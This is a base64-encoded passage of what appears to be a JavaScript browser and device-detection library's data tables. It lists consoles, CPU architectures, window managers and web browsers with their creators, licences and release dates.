iOiBcIlRlbGV2aXNpb25cIiwgXCJtYW51ZmFjdHVyZVwiOiBcIk1pY3Jvc29mdC5cIn0sXHJcbiAgICAgICAgICAgIFwieGJveFwiOiB7XCJuYW1lXCI6IFwiWGJveCAzNjBcIiwgXCJkZXZpY2VcIjogXCJUZWxldmlzaW9uXCIsIFwibWFudWZhY3R1cmVcIjogXCJNaWNyb3NvZnQuXCJ9LFxyXG4gICAgICAgICAgICBcInhib3ggb25lXCI6IHtcIm5hbWVcIjogXCJYYm94IE9uZVwiLCBcImRldmljZVwiOiBcIlRlbGV2aXNpb25cIiwgXCJtYW51ZmFjdHVyZVwiOiBcIk1pY3Jvc29mdC5cIn0sXHJcbiAgICAgICAgICAgIFwid2lpXCI6IHtcIm5hbWVcIjogXCJXaWlcIiwgXCJkZXZpY2VcIjogXCJUZWxldmlzaW9uXCIsIFwibWFudWZhY3R1cmVcIjogXCJOaW50ZW5kby5cIn0sXHJcbiAgICAgICAgICAgIFwid2lpdVwiOiB7XCJuYW1lXCI6IFwiV2lpVVwiLCBcImRldmljZVwiOiBcIlRlbGV2aXNpb25cIiwgXCJtYW51ZmFjdHVyZVwiOiBcIk5pbnRlbmRvLlwifSxcclxuICAgICAgICAgICAgXCJ4OTYgbWluaVwiOiB7XCJuYW1lXCI6IFwiWDk2IG1pbmlcIiwgXCJkZXZpY2VcIjogXCJUZWxldmlzaW9uXCIsIFwibWFudWZhY3R1cmVcIjogXCJTaHlTa3kuXCJ9XHJcbiAgICAgICAgfTtcclxuXHJcbiAgICAgICAgLypEZXZpY2VzIENhdGVnb3JpZXMqL1xyXG4gICAgICAgIHRoaXMuZGV2aWNlc0NhdGVnb3J5TGlzdCA9IHtcclxuICAgICAgICAgICAgJ2xpbnV4JzogJ2xpbnV4JyxcclxuICAgICAgICAgICAgJ21hYyc6ICdtYWMnLFxyXG4gICAgICAgICAgICAnd2luJzogJ3dpbicsXHJcbiAgICAgICAgICAgICdtb2JpJzogJ21vYmknLFxyXG4gICAgICAgIH07XHJcblxyXG4gICAgICAgIC8qRGV2aWNlcyBhcmNoaXRlY3R1cmUgTGlzdCovXHJcbiAgICAgICAgdGhpcy5kZXZpY2VzQXJjaGl0ZWN0dXJlTGlzdCA9IHtcclxuICAgICAgICAgICAgXCJBUk12MVwiOiBcIjMyIGJpdFwiLFxyXG4gICAgICAgICAgICBcIkFSTXYyXCI6IFwiMzIgYml0XCIsXHJcbiAgICAgICAgICAgIFwiQVJNdjNcIjogXCIzMiBiaXRcIixcclxuICAgICAgICAgICAgXCJBUk12NFwiOiBcIjMyIGJpdFwiLFxyXG4gICAgICAgICAgICBcIkFSTXY0VFwiOiBcIjMyIGJpdFwiLFxyXG4gICAgICAgICAgICBcIkFSTXY1VEVcIjogXCIzMiBiaXRcIixcclxuICAgICAgICAgICAgXCJBUk12NlwiOiBcIjMyIGJpdFwiLFxyXG4gICAgICAgICAgICBcIkFSTXY2LU1cIjogXCIzMiBiaXRcIixcclxuICAgICAgICAgICAgXCJBUk12Ny1NXCI6IFwiMzIgYml0XCIsXHJcbiAgICAgICAgICAgIFwiQVJNdjdFLU1cIjogXCIzMiBiaXRcIixcclxuICAgICAgICAgICAgXCJBUk12OC1NXCI6IFwiMzIgYml0XCIsXHJcbiAgICAgICAgICAgIFwiQVJNdjctUlwiOiBcIjMyIGJpdFwiLFxyXG4gICAgICAgICAgICBcIkFSTXY4LVJcIjogXCIzMiBiaXRcIixcclxuICAgICAgICAgICAgXCJBUk12Ny1BXCI6IFwiMzIgYml0XCIsXHJcbiAgICAgICAgICAgIFwiQVJNdjgtQVwiOiBcIjY0IGJpdFwiLFxyXG4gICAgICAgICAgICBcIkFSTXY4LjEtQVwiOiBcIjY0XFwvMzIgYml0XCIsXHJcbiAgICAgICAgICAgIFwiQVJNdjguMi1BXCI6IFwiNjRcXC8zMiBiaXRcIixcclxuICAgICAgICAgICAgXCJBUk12OC4zLUFcIjogXCI2NFxcLzMyIGJpdFwiLFxyXG4gICAgICAgICAgICBcIkFSTXY4LjQtQVwiOiBcIjY0XFwvMzIgYml0XCIsXHJcbiAgICAgICAgICAgIFwiQVJNdjguNS1BXCI6IFwiNjRcXC8zMiBiaXRcIixcclxuICAgICAgICAgICAgXCJBUk12OC42LUFcIjogXCI2NFxcLzMyIGJpdFwiLFxyXG4gICAgICAgICAgICBcImkyODZcIjogXCIxNiBCaXRcIixcclxuICAgICAgICAgICAgXCJXaW4xNlwiOiBcIjE2IEJpdFwiLFxyXG4gICAgICAgICAgICBcImkzODZcIjogXCIzMiBCaXRcIixcclxuICAgICAgICAgICAgXCJpNDg2XCI6IFwiMzIgQml0XCIsXHJcbiAgICAgICAgICAgIFwiaTU4NlwiOiBcIjMyIEJpdFwiLFxyXG4gICAgICAgICAgICBcImk2ODZcIjogXCIzMiBCaXRcIixcclxuICAgICAgICAgICAgXCJpNzg2XCI6IFwiMzIgQml0XCIsXHJcbiAgICAgICAgICAgIFwieDg2XCI6IFwiMzIgQml0XCIsXHJcbiAgICAgICAgICAgIFwieDY0XCI6IFwiNjQgQml0XCIsXHJcbiAgICAgICAgICAgIFwiV09XNjRcIjogXCI2NCBCaXRcIixcclxuICAgICAgICAgICAgXCJXaW42NFwiOiBcIjY0IEJpdFwiLFxyXG4gICAgICAgICAgICBcIng4Nl82NFwiOiBcIjY0IEJpdFwiLFxyXG4gICAgICAgICAgICBcIng4Ni02NFwiOiBcIjY0IEJpdFwiLFxyXG4gICAgICAgICAgICBcIng2NFxcXFxcXC94ODZcIjogXCI2NCBCaXRcIixcclxuICAgICAgICAgICAgXCJJQS02NFwiOiBcIjY0IEJpdFwiLFxyXG4gICAgICAgICAgICBcIkFSTTY0XCI6IFwiNjQgQml0XCIsXHJcbiAgICAgICAgICAgIFwiQU1ENjRcIjogXCI2NCBCaXRcIixcclxuICAgICAgICAgICAgXCJJbnRlbDY0XCI6IFwiNjQgQml0XCJcclxuICAgICAgICB9O1xyXG5cclxuICAgICAgICAvKlBsYXRmb3JtJ3MgV2luZG93IE1hbmFnZXIqL1xyXG4gICAgICAgIHRoaXMuZGV2aWNlc1BsYXRmb3JtV01OYW1lTGlzdCA9IHtcclxuICAgICAgICAgICAgJ3gxMSc6IHsnbmFtZSc6ICdMaW51eCBEZXNrdG9wLCcsICd0eXBlJzogJ1gxMSBXaW5kb3cgTWFuYWdlci4nfSxcclxuICAgICAgICAgICAgJ3dpbic6IHsnbmFtZSc6ICdXaW5kb3dzIERlc2t0b3AsJywgJ3R5cGUnOiAnV2luZG93cyBXaW5kb3cgTWFuYWdlci4nLH0sXHJcbiAgICAgICAgICAgICdtYWMnOiB7J25hbWUnOiAnTWFjaW50b3NoLCcsICd0eXBlJzogJ01hYyBXaW5kb3cgTWFuYWdlci4nLH0sXHJcbiAgICAgICAgfTtcclxuXHJcbiAgICAgICAgLypXZWIgQnJvd3NlciBMaXN0Ki9cclxuICAgICAgICB0aGlzLndlYkJyb3dzZXJMaXN0ID0ge1xyXG4gICAgICAgICAgICBcIjAwN2FjOSBDcmF3bGVyXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIjAwN2FjOSBDcmF3bGVyXCIsXHJcbiAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJDcmF3bGVyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiRnVsbFRleHRNb2RlXCIsXHJcbiAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIjAwN2FjOVwiLFxyXG4gICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cDpcXC9cXC9jcmF3bGVyLjAwN2FjOS5uZXRcIlxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIjExNUJyb3dzZXJcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiMTE1IEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiR3JhcGhpY2FsTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIjExNSBUZWFtXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcLzExNS5jb21cXC9cIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImNvc3RcIjogXCJGcmVlXCIsXHJcbiAgICAgICAgICAgICAgICBcInN0YXR1c1wiOiBcIkFjdGl2ZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJsaWNlbmNlXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlVua25vd25cIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBcIlVua25vd25cIixcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIlVua25vd25cIixcclxuICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJVbmtub3duXCJcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCIxMjZCUk9XU0VSXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIjEyNiBCUk9XU0VSXCIsXHJcbiAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJXZWIgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ1aVwiOiBcIkdyYXBoaWNhbE1vZGVcIixcclxuICAgICAgICAgICAgICAgIFwiY3JlYXRvclwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJVbmtub3duXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJjb3N0XCI6IFwiRnJlZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJVbmtub3duXCIsXHJcbiAgICAgICAgICAgICAgICBcImxpY2VuY2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiVW5rbm93blwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF5b3V0XCI6IFwiVW5rbm93blwiLFxyXG4gICAgICAgICAgICAgICAgXCJsYXRlc3QtcmVsZWFzZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiVW5rbm93blwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIlVua25vd25cIlxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIjEzMzdCcm93c2VyXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIjEzMzcgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ0eXBlXCI6IFwiV2ViIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidWlcIjogXCJHcmFwaGljYWxNb2RlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNyZWF0b3JcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiVW5rbm93blwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkZyZWVcIixcclxuICAgICAgICAgICAgICAgIFwic3RhdHVzXCI6IFwiVW5rbm93blwiLFxyXG4gICAgICAgICAgICAgICAgXCJsaWNlbmNlXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlVua25vd25cIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBcIlVua25vd25cIixcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIlVua25vd25cIixcclxuICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJVbmtub3duXCJcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCIxUGFzc3dvcmRcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiMSBQYXNzd29yZFwiLFxyXG4gICAgICAgICAgICAgICAgXCJ0eXBlXCI6IFwiUGFzc3dvcmQgTWFuYWdlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ1aVwiOiBcIkZ1bGxUZXh0TW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkFnaWxlQml0cyBJbmNcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvMXBhc3N3b3JkLmNvbVxcL1wiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIlRyaWFsd2FyZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJBY3RpdmVcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJUcmlhbHdhcmVcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9UcmlhbHdhcmVcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJUcmlkZW50XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvVHJpZGVudF8oc29mdHdhcmUpXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXRlc3QtcmVsZWFzZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJBbmRyb2lkXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiNy41LjFcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiTWF5IDQsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJpT1NcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCI3LjUuMlwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJBcHJpbCAyMiwgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcIm1hY09TXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiNy41XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIk1heSA1LCAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIFwiV2luZG93c1wiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjcuNC43NjdcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiQXByaWwgMjcsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCIxc3RCcm93c2VyXCI6IFwiMXN0IEJyb3dzZXJcIixcclxuICAgICAgICAgICAgXCIyMzQ1RXhwbG9yZXJcIjogXCIyMzQ1IEV4cGxvcmVyXCIsXHJcbiAgICAgICAgICAgIFwiTWIyMzQ1QnJvd3NlclwiOiBcIjIzNDUgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICBcIjIzNDVjaHJvbWVcIjogXCIyMzQ1IENocm9tZVwiLFxyXG4gICAgICAgICAgICBcIjM2MFNFXCI6IFwiMzYwIFNlY3VyZSBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgIFwiQW1heWFcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQW1heWFcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiR3JhcGhpY2FsTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlczQ1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC93d3cudzMub3JnXFwvXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiSU5SSUFcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cDpcXC9cXC93d3cuaW5yaWEuZnJcXC9lblxcL1wiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkZyZWVcIixcclxuICAgICAgICAgICAgICAgIFwic3RhdHVzXCI6IFwiZGlzY29udGludWVkXCIsXHJcbiAgICAgICAgICAgICAgICBcImxpY2VuY2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiVzNDXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvVzNDX1NvZnR3YXJlX05vdGljZV9hbmRfTGljZW5zZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF5b3V0XCI6IFwiY3VzdG9tXCIsXHJcbiAgICAgICAgICAgICAgICBcImxhdGVzdC1yZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCIxMS40LjRcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJKYW51YXJ5IDE4LCAyMDEyXCJcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJBT0xcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQU9MIEV4cGxvcmVyXCIsXHJcbiAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJXZWIgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ1aVwiOiBcIkdyYXBoaWNhbE1vZGVcIixcclxuICAgICAgICAgICAgICAgIFwiY3JlYXRvclwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJBbWVyaWNhIE9ubGluZSwgSW5jXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL3d3dy5hb2wuY29tXFwvXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJjb3N0XCI6IFwiRnJlZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJkaXNjb250aW51ZWRcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJQcm9wcmlldGFyeVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL1Byb3ByaWV0YXJ5X3NvZnR3YXJlXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXlvdXRcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiVHJpZGVudFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL1RyaWRlbnRfKHNvZnR3YXJlKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjEuNVwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIk1heSAxMCwgMjAxNlwiXHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiQXJvcmFcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQXJvcmFcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiR3JhcGhpY2FsTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkF2YW50IEZvcmNlXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJjb3N0XCI6IFwiRnJlZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJkaXNjb250aW51ZWRcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJQcm9wcmlldGFyeVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL1Byb3ByaWV0YXJ5X3NvZnR3YXJlXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXlvdXRcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQmxpbmtcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9XZWJLaXRcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxhdGVzdC1yZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCIwLjExLjBcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCIyNyBTZXB0ZW1iZXIgMjAxMFwiXHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiQXZhbnRcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQXZhbnQgXCIsXHJcbiAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJXZWIgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ1aVwiOiBcIkdyYXBoaWNhbE1vZGVcIixcclxuICAgICAgICAgICAgICAgIFwiY3JlYXRvclwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJCZW5qYW1pbiBDLiBNZXllclwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkZyZWVcIixcclxuICAgICAgICAgICAgICAgIFwic3RhdHVzXCI6IFwiQWN0aXZlXCIsXHJcbiAgICAgICAgICAgICAgICBcImxpY2VuY2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiR1BMXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvR05VX0dlbmVyYWxfUHVibGljX0xpY2Vuc2VcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJXZWJLaXRcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9CbGlua18obGF5b3V0X2VuZ2luZSlcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJHZWNrb1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0dlY2tvXyhsYXlvdXRfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlRyaWRlbnRcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9UcmlkZW50XyhsYXlvdXRfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjIwMjAgYnVpbGQgM1wiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIk1hcmNoIDE3LCAyMDIwXCJcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJCYXNpbGlza1wiOiB7XHJcbiAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJCYXNpbGlzayBcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiR3JhcGhpY2FsTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIk1vb25jaGlsZCBQcm9kdWN0aW9uc1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC93d3cuYmFzaWxpc2stYnJvd3Nlci5vcmdcXC9cIlxyXG4gICAgICAgICAgICAgICAgICAgIH1